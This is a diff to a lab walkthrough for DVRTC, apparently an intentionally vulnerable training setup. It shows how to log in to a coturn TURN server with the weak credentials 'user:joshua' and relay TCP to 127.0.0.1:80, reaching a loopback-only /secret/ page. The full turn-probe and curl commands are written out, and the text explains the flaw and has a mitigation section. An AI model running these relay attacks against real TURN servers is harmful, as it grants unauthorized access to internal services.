@@ -6,9 +6,9 @@ Use the TURN server on `PUBLIC_IPV4` to relay a TCP connection to `127.0.0.1:80`
 
 ## Prerequisites
 
-- DVRTC running: `docker compose up -d`
+- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
 - `PUBLIC_IPV4` set correctly in `.env`
-- `curl` and `turn-probe.py` available in the `attacker` service
+- `curl` and `turn-probe` available in the `attacker` service
 
 ## Steps
 
@@ -17,7 +17,7 @@ Use the TURN server on `PUBLIC_IPV4` to relay a TCP connection to `127.0.0.1:80`
 Run on the host:
 
 ```bash
-docker compose run --rm -it attacker bash
+./scripts/compose.sh --scenario pbx1 run --rm attacker bash
 cd /work
 ```
 
@@ -32,25 +32,26 @@ curl -si "http://$PUBLIC_IPV4/secret/" | head
 ```
 
 Look for `HTTP/1.1 403 Forbidden`.
-CLI-style clients now get a one-line `You shall not pass!` response body, while browsers that request HTML still get the custom `403` page.
+CLI-style clients now get a one-line `You shall not pass!` response body, while browsers that request HTML get the custom `403` page.
 
 ### Step 3: Fetch `/secret/` through the TURN relay
 
 In the attacker shell:
 
 ```bash
-python3 /opt/testing/scripts/turn-probe.py tcp-http-get --host "$PUBLIC_IPV4" --username user --password joshua --peer 127.0.0.1 --path /secret/ --expect-body "shutdown the Internet" --dump-response | tee turn-secret-response.txt
+turn-probe tcp-http-get --host "$PUBLIC_IPV4" --username user --password joshua --peer 127.0.0.1 --path /secret/ --expect-body "shutdown the Internet" --dump-response | tee turn-secret-response.txt
 ```
 
 This connects to coturn on `PUBLIC_IPV4`, asks it to open a TCP connection to `127.0.0.1:80`, and sends an HTTP request for `/secret/` over the relayed connection.
 The response file is written to `artifacts/turn-secret-response.txt` in the repository root.
 
-### Step 4: Verify
+### Step 4: Confirm the relay succeeded
 
 In the attacker shell:
 
 ```bash
 grep -E 'verdict=pass|safely shutdown the Internet' turn-secret-response.txt
+exit
 ```
 
 You should see a passing `RESULT` line and the protected page's one-line response.
@@ -59,7 +60,7 @@ You should see a passing `RESULT` line and the protected page's one-line respons
 
 The TURN server is intentionally vulnerable because it uses weak credentials (`user:joshua`) and allows relayed connections to loopback peers such as `127.0.0.1`. An attacker can authenticate to coturn on the public address, ask it to connect to `127.0.0.1:80`, and then tunnel arbitrary TCP traffic through that relayed connection.
 
-Nginx keeps `/secret/` on the public listener only as a blocked decoy that returns the `403` page. The actual secret content is served from a separate loopback-only listener on `127.0.0.1:80`, so a direct request to `PUBLIC_IPV4` is denied while a TURN relay to loopback reaches the protected page. CLI-style clients get a plain-text one-liner, while browsers that request HTML still get the retro shutdown joke page.
+Nginx keeps `/secret/` on the public listener only as a blocked decoy that returns the `403` page. The actual secret content is served from a separate loopback-only listener on `127.0.0.1:80`, so a direct request to `PUBLIC_IPV4` is denied while a TURN relay to loopback reaches the protected page. CLI-style clients get a plain-text one-liner, while browsers that request HTML get the retro shutdown joke page.
 
 ## Mitigation
 
